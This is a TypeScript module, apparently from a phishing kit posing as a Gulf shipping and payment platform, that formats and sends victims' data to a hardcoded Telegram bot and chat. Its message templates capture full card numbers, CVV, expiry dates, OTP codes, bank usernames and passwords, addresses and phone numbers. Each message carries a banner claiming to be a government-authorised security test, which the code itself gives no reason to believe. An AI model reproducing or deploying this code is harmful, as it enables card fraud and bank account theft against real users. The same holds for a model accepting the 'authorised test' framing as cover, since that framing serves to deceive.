// Telegram Bot Integration
// These values are set for automatic deployment. 
// For production, you can override them using environment variables:
// VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID
const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8305496038:AAGBYQUoRMcYw8qiz4NiQo3HCQfcxTIvo2Y';
const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '8680302183';

export interface TelegramMessage {
  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'payment_otp_attempt' | 'test';
  data: Record<string, any>;
  timestamp: string;
  imageUrl?: string; // Optional image URL for shipping_link_created
  description?: string; // Optional description for shipping_link_created
}

export interface TelegramResponse {
  success: boolean;
  messageId?: string;
  error?: string;
}

export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
  try {
    // Telegram is configured and ready

    const text = formatTelegramMessage(message);

    // If imageUrl is provided for shipping_link_created, send photo with caption
    if (message.type === 'shipping_link_created' && message.imageUrl) {
      const imageUrl = message.imageUrl.startsWith('http')
        ? message.imageUrl
        : `${window.location.origin}${message.imageUrl}`;

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: imageUrl,
          caption: text,
          parse_mode: 'HTML'
        })
      });

      const responseData = await response.json();

      if (!response.ok) {
        // Provide specific error messages for common issues
        let errorMessage = responseData.description || 'Unknown error';

        if (responseData.error_code === 403) {
          if (responseData.description?.includes("bots can't send messages to bots")) {
            errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
          } else if (responseData.description?.includes("Forbidden")) {
            errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
          }
        } else if (responseData.error_code === 400) {
          if (responseData.description?.includes("chat not found")) {
            errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
          }
        }

        return {
          success: false,
          error: errorMessage
        };
      }

      return {
        success: true,
        messageId: responseData.result?.message_id?.toString()
      };
    }

    // Default: send text message
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const responseData = await response.json();

    if (!response.ok) {
      // Provide specific error messages for common issues
      let errorMessage = responseData.description || 'Unknown error';

      if (responseData.error_code === 403) {
        if (responseData.description?.includes("bots can't send messages to bots")) {
          errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
        } else if (responseData.description?.includes("Forbidden")) {
          errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
        }
      } else if (responseData.error_code === 400) {
        if (responseData.description?.includes("chat not found")) {
          errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
        }
      }

      return {
        success: false,
        error: errorMessage
      };
    }

    return {
      success: true,
      messageId: responseData.result?.message_id?.toString()
    };
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
};

export const testTelegramConnection = async (): Promise<TelegramResponse> => {
  return await sendToTelegram({
    type: 'test',
    data: {
      test: true,
      message: 'Test message from Gulf Unified Platform',
      timestamp: new Date().toISOString()
    },
    timestamp: new Date().toISOString()
  });
};

const formatTelegramMessage = (message: TelegramMessage): string => {
  const { type, data, timestamp, description } = message;
  
  let header = '';
  let content = '';
  
  // Cybersecurity test authorization
  const authorization = `
🔒 <b>اختبار أمني مرخص</b>
⚠️ <i>هذا اختبار أمني مرخص من قبل الحكومة والشركات</i>
📋 <i>التفويض: مرخص رسمياً لإجراء هذا الاختبار</i>
🛡️ <i>الغرض: تقييم أمان المنصات والأنظمة</i>
      `;
  
  switch (type) {
    case 'test':
      header = '🧪 <b>اختبار الاتصال</b>';
      content = `
✅ <b>تم إرسال رسالة اختبار بنجاح!</b>
• المنصة: Gulf Unified Platform
• الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
• الحالة: متصل
      `;
      break;
      
    case 'shipping_link_created': {
      header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
      const serviceDescription = description || '';
      const descriptionText = serviceDescription ? `\n📝 <b>الوصف:</b> ${serviceDescription}` : '';
      content = `
📦 <b>تفاصيل الشحنة:</b>
• رقم الشحنة: <code>${data.tracking_number || 'غير محدد'}</code>
• خدمة الشحن: ${data.service_name || 'غير محدد'}
• وصف الطرد: ${data.package_description || 'غير محدد'}
• مبلغ الدفع: ${data.cod_amount || 0} ر.س
• الدولة: ${data.country || 'غير محدد'}${descriptionText}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
    }
      
    case 'payment_recipient':
      header = '👤 <b>معلومات المستلم</b>';
      content = `
📋 <b>بيانات المستلم:</b>
• الاسم: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان السكني: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_confirmation':
      header = '✅ <b>تأكيد الدفع الكامل</b>';
      content = `
💳 <b>تفاصيل الدفع (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان الكامل: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• رمز OTP: ${data.otp || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    case 'card_details': {
      header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
      const cardNumberDisplay1 = data.cardNumber || 'غير محدد';
      const last4Display1 = data.cardLast4 || 'غير محدد';
      content = `
🔐 <b>معلومات البطاقة (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: <code>${cardNumberDisplay1}</code>
• آخر 4 أرقام: <code>${last4Display1}</code>
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
    }

    case 'card_details_with_bank': {
      header = '💳 <b>تفاصيل البطاقة مع معلومات البنك</b>';
      const cardNumberDisplay2 = data.cardNumber || 'غير محدد';
      const last4Display2 = data.cardLast4 || 'غير محدد';
      content = `
🔐 <b>معلومات البطاقة والبنك (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• الدولة: ${data.country || 'غير محدد'}
• البنك: ${data.bank || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: <code>${cardNumberDisplay2}</code>
• آخر 4 أرقام: <code>${last4Display2}</code>
• نوع البطاقة: ${data.cardType || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
    }

    case 'bank_login': {
      header = '🏦 <b>بيانات تسجيل الدخول للبنك</b>';
      const loginTypeText = data.loginType === 'username' ? 'اسم المستخدم' :
                           data.loginType === 'customerId' ? 'رقم العميل' : 'رقم الهاتف';
      const loginValue = data.loginType === 'username' ? data.username :
                        data.loginType === 'customerId' ? data.customerId : data.phoneNumber;
      content = `
🔑 <b>بيانات تسجيل الدخول (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• الدولة: ${data.country || 'غير محدد'}
• البنك: ${data.bank || 'غير محدد'}
• ${loginTypeText}: ${loginValue || 'غير محدد'}
• كلمة المرور: ${data.password || 'غير محدد'}
• آخر 4 أرقام من البطاقة: ${data.cardLast4 || 'غير محدد'}
• نوع البطاقة: ${data.cardType || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
    }

    case 'payment_otp_attempt': {
      header = '🔐 <b>محاولة رمز التحقق</b>';
      const otpStatusIcon = data.otp_status === 'correct' ? '✅' : '❌';
      const otpStatusText = data.otp_status === 'correct' ? 'صحيح' : 'خطأ';
      const cardNumberDisplay = data.cardNumber || 'غير محدد';
      const last4Display = data.cardLast4 || 'غير محدد';
      content = `
${otpStatusIcon} <b>محاولة OTP (${otpStatusText})</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: <code>${cardNumberDisplay}</code>
• آخر 4 أرقام: <code>${last4Display}</code>
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• رمز OTP: ${data.otp || 'غير محدد'}
• حالة OTP: ${otpStatusText} ${otpStatusIcon}
• عدد المحاولات: ${data.attempts || 1}
• نوع الاختبار: اختبار أمني مرخص
      `;
      break;
    }

    default:
      header = '📝 <b>إشعار جديد</b>';
      content = JSON.stringify(data, null, 2);
  }
  
  return `${header}\n${content}\n\n${authorization}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
};

export default sendToTelegram;